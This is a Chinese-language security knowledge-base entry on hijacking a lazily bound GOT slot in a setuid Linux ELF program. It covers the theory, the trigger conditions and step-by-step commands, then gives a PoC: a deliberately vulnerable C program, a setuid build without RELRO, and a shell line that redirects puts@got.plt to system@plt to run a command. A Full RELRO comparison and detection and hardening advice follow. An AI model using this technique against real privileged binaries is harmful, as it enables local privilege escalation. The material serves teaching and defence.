---
id: binary-pwn-setuid-got-plt-lazy-binding-hijack
title: setuid 程序 GOT/PLT 惰性绑定劫持：任意 8 字节写覆写 puts@got.plt 为 system@plt（shell 可能降权）
type: scenario
domain: binary
path: binary/pwn
technique: setuid-got-plt-lazy-binding-hijack
tags:
- pwn
- elf
- got
- plt
- lazy-binding
- setuid
- relro
- arbitrary-write
- privilege-escalation
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T20:12:03+08:00'
  notes: V97 指出的表述问题已修正：导出分支不经过 DllMain / x86 不依赖 .pdata / setuid 卡不再宣称已获得 euid=0
url: /docs/binary/pwn/binary-pwn-setuid-got-plt-lazy-binding-hijack/
draft: false
kb_aliases:
- GOT/PLT 惰性绑定劫持
- lazy binding GOT 覆写
- setuid GOT hijack
- puts@got.plt 改 system@plt
- Partial RELRO GOT 可写
- secure-execution 不保护 GOT
---

## 一句话结论

在开启 lazy binding 且未启用 Full RELRO 的 setuid ELF 程序中，只要进程内存在一次可控的 8 字节写，就可以把 `puts@got.plt` 改成同一二进制里的 `system@plt`；随后源码中的 `puts(argv[4])` 实际执行 `system(argv[4])`。是否能保持文件属主的有效权限取决于 shell 与参数：`/bin/sh -c` 在 euid 与 ruid 不一致时可能主动降权，原文实测 `id` 输出为 `uid=1000`，未观察到 `euid=0`，控制流改向应以 GDB/strace 为准；Full RELRO（`-z relro -z now`）会让 GOT 页在进入 `main` 前变为只读，同样的写入在内核页权限检查处触发 `SIGSEGV`。

## 原理

- ELF 动态链接程序调用外部函数时，调用点先进入 `.plt` 中的桩（如 `puts@plt`）。桩的第一条指令是 `jmp QWORD PTR [rip + puts_got]`，从 `.got.plt` 的 `R_X86_64_JUMP_SLOT` 槽读取目标地址。首次调用且 lazy binding 开启时，槽里是链接器写入的 `puts@plt+6`（`push` 指令地址），控制流经 PLT0 进入 `_dl_runtime_resolve`；动态链接器解析出 libc 中 `puts` 的真实地址后写回槽位，后续调用直接命中 libc。
- lazy binding 要求 `.got.plt` 在运行期可写，因此 No RELRO / Partial RELRO 下该页保持 `rw-p`。如果程序存在进程内写缺陷（任意地址写、越界写、格式化字符串 `%n`、UAF 写、错误指针解引用、暴露出的 `poke` 类接口），就能覆盖导入函数槽。
- 选择 `puts` → `system` 是因为 x86_64 System V ABI 下两者第一个参数都在 `rdi`：源码 `puts(argv[4])` 的调用点不重新组织参数，覆写后自然变成 `system(argv[4])`，`argv[4]` 被 `/bin/sh -c` 当作命令执行。参数个数、类型或调用约定不匹配的函数对替换后可能崩溃或行为异常。
- setuid 会放大影响：程序启动后 effective UID 变为文件属主（通常是 root）。glibc 检测到 `AT_SECURE` 后进入 secure-execution 模式，过滤 `LD_PRELOAD`、`LD_LIBRARY_PATH`、`LD_AUDIT`、`GCONV_PATH`、`LOCPATH`、`MALLOC_TRACE`、`TMPDIR` 等环境变量，防止通过加载环境注入；但这些措施只约束动态链接器的外部输入，不会修复程序内部的错误写入，也不会把 GOT 槽设为只读。
- RELRO 与 lazy binding 的边界：`-z now` 只让重定位在启动阶段完成（关闭首次调用解析），`-z relro` 才把重定位后的 GOT 相关页 `mprotect` 为只读；两者同时启用才是 Full RELRO。只有 `-z now` 而没有 `-z relro`，GOT 页仍可写；只有 `-z relro` 而没有 `-z now`（Partial RELRO），`.got.plt` 为支持 lazy binding 通常仍保持可写。
- Full RELRO 下写入失败的信号是 `SIGSEGV` 且 `si_code=SEGV_ACCERR`：地址已映射（`x/gx` 能读出槽值），只是页权限不允许写；这与地址未映射的 `SEGV_MAPERR` 可区分，能直接证明失败点是 GOT 槽写入。

## 触发条件

- 目标是 setuid（或 setgid）ELF 程序，文件属主为高权限用户（如 root），所在挂载点未设置 `nosuid`。
- 二进制未启用 Full RELRO：No RELRO 或 Partial RELRO；仅加 `-z now` 不加 `-z relro` 不足以保护 GOT 页。
- 程序内部存在可控的进程内写原语，且攻击者能控制写入地址与写入值；真实场景对应格式化字符串、栈/堆越界写、UAF 写、类型混淆导致的指针写等。
- 目标函数在 `.got.plt` 中有 JUMP_SLOT，并且其调用点的参数与替换函数 ABI 兼容（典型如 `puts(buf)` → `system(buf)`，`atoi`/`free` 等同理需确认参数含义）。
- 能取得地址：非 PIE 可直接从 `readelf`/`objdump` 读取；PIE 需先泄露加载基址。
- 运行环境允许 setuid 生效；`system()` 通过 `/bin/sh -c` 执行，部分 shell（如某些发行版的 dash）在 euid 与 ruid 不一致时会主动降权，导致 `id` 看不到 `euid=0`；判断控制流是否改向应以 GDB/strace 为准，不能只看 `id` 输出。

## 利用步骤

1. 检查保护与链接方式：`checksec` 或 `readelf -lW`/`readelf -dW` 确认没有 `GNU_RELRO` 与 `BIND_NOW`，程序为非 PIE `EXEC`，并保留 lazy binding。
2. 确认进程内写原语及其可控性（示例用一个故意暴露的 8 字节写分支模拟）。
3. 提取 `puts@got.plt` 的虚拟地址：
   ```bash
   readelf -rW ./victim | awk '/puts@/ && /JUMP_SLOT/ {print "0x" $1; exit}'
   ```
4. 提取同一二进制的 `system@plt` 入口地址：
   ```bash
   objdump -d -M intel ./victim | sed -n '/<system@plt>:/,+3p'
   ```
5. 通过写原语把 `puts@got.plt` 槽写成 `system@plt` 地址，然后让程序继续执行 `puts(argv[4])`。
6. 验证控制流：GDB 在 `puts@plt` 下断点，`x/gx <puts_got>` 应显示 `system@plt` 地址；`si` 后 `x/i $pc` 应落在 `system@plt`；`strace -f -e trace=execve` 可看到 `/bin/sh -c <命令>`。
7. 对照 Full RELRO：用 `-Wl,-z,relro -Wl,-z,now` 重新编译并重新提取地址，同样的写操作会在 `*slot = value` 处崩溃，`info proc mappings` 显示 GOT 所在页为 `r--p`。

## PoC

最小样本（故意暴露一次 8 字节写）：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

static volatile int keep;
__attribute__((noinline, used)) static void keep_system(void) {
    if (keep) system("true");   /* 保留 system@plt，正常路径不执行 */
}
int main(int argc, char **argv) {
    keep_system();
    if (argc == 5 && !strcmp(argv[1], "poke")) {
        *(volatile uintptr_t *)strtoull(argv[2], 0, 0) = strtoull(argv[3], 0, 0);
        puts(argv[4]);          /* 槽被改写后实际进入 system(argv[4]) */
        return 0;
    }
    if (argc == 3 && !strcmp(argv[1], "say")) { puts(argv[2]); return 0; }
    return 1;
}
```

构建弱保护与 setuid 版本：

```bash
gcc -O0 -g -no-pie -fno-pie -fno-stack-protector \
    -Wl,-z,lazy -Wl,-z,norelro -fcf-protection=none \
    victim.c -o victim_weak
sudo chown root:root victim_weak
sudo chmod 4755 victim_weak

PUTS_GOT=$(readelf -rW victim_weak | awk '/puts@/ && /JUMP_SLOT/ {print "0x" $1; exit}')
SYSTEM_PLT=$(objdump -d victim_weak | awk '/<system@plt>:/ {gsub(":","",$1); print "0x" $1; exit}')
./victim_weak poke "$PUTS_GOT" "$SYSTEM_PLT" 'id'
```

Full RELRO 对照：

```bash
gcc -O0 -g -no-pie -fno-pie -fno-stack-protector \
    -Wl,-z,relro -Wl,-z,now -fcf-protection=none \
    victim.c -o victim_relro
# 重新提取 victim_relro 自己的 PUTS_GOT / SYSTEM_PLT 后：
./victim_relro poke "$PUTS_GOT" "$SYSTEM_PLT" 'id'   # SIGSEGV, si_code=SEGV_ACCERR
```

说明：原文在 Kali（kernel 6.18、glibc 2.42、gcc 15.2）完整复现，弱保护版本 GOT 槽从 `puts@plt+6` 回填为 libc `puts` 地址，`poke` 后槽值变为 `system@plt`，GDB 与 strace 均确认控制流进入 `system` 并执行 `/bin/sh -c id`；Full RELRO 版本写入 GOT 时崩溃，`strace` 显示 `mprotect(..., PROT_READ)` 后 `si_code=SEGV_ACCERR`、`si_addr` 等于 `puts@got.plt`。PoC 未在本文档环境复跑，示例地址需按实际二进制重新提取。

## 变体与关联

- **格式化字符串 `%n`**：把 `printf@got`/`puts@got` 改成 `system` 是同一目标槽位的经典写原语，详见 [[binary-pwn-format-string-got-hijack]]。
- **其他函数对**：`atoi@got`→`system`（后续输入命令字符串）、`free@got`→`system`（堆块内容需以命令开头）、`strlen`/`strcmp` 等以用户指针为第一参数的函数；替换前必须核对 ABI 与调用点参数。
- **GOT 不可写时**：转向返回地址、`.fini_array`、函数指针表、虚表或 `__stack_chk_fail@got` 等控制流目标；也可用 ret2dlresolve 利用惰性解析机制本身，参见 [[binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-linkmap]]。
- **RELRO 组合**：No RELRO、Partial RELRO（`-z relro` + `-z lazy`，`.got.plt` 通常仍可写）、Full RELRO（`-z relro` + `-z now`）；只开 `-z now` 不等于 Full RELRO。
- **ELF 链接机制的相邻风险**：COPY 重定位把共享库安全状态复制进主程序 `.bss`，RELRO 同样保护不到，参见 [[binary-pwn-elf-copy-relocation-writable-security-state]]。
- **secure-execution 的边界**：它只过滤 `LD_*`/`GCONV_PATH` 等加载环境变量，不阻止程序自身的内存写；不要把它当作 setuid 程序的内存安全防护。

## 检测与防御

- **构建加固**：对 setuid/setgid 等特权 ELF 默认使用 `-Wl,-z,relro -Wl,-z,now`（Full RELRO）；`checksec` 基线检查禁止 No/Partial RELRO 的高权限二进制。
- **修复根因**：消除任意写/越界写/格式化字符串/错误指针写入；所有用户输入按长度与边界校验；禁止 `printf(buf)` 一类把输入当格式串的用法；不向高权限进程暴露任意读写接口。
- **降低特权暴露**：减少 setuid 程序的职责与特权持续时间，在解析不可信输入前降权（`setresuid`），必要时用能力（capabilities）替代完整 root。
- **检测**：
  - 运行期比对 `.got.plt` 槽值与动态链接器解析结果，发现 GOT 完整性被破坏；
  - 监控 setuid 程序在业务阶段对 GOT 页的写操作，或写 GOT 后立即出现的 `SIGSEGV`（`SEGV_ACCERR` 且 `si_addr` 落在 `.got.plt`）；
  - 审计 setuid 程序的 `execve` 行为，出现 `/bin/sh -c` 或异常子进程可作为控制流改向信号；
  - 对 No/Partial RELRO 的高权限二进制做资产盘点与告警。
- **边界**：Full RELRO 只保护 GOT 相关页，不保护函数指针、虚表、`.bss`、栈上的回调地址；PIE/ASLR、Canary、NX、CET 解决的是不同问题，不能替代内存安全修复。
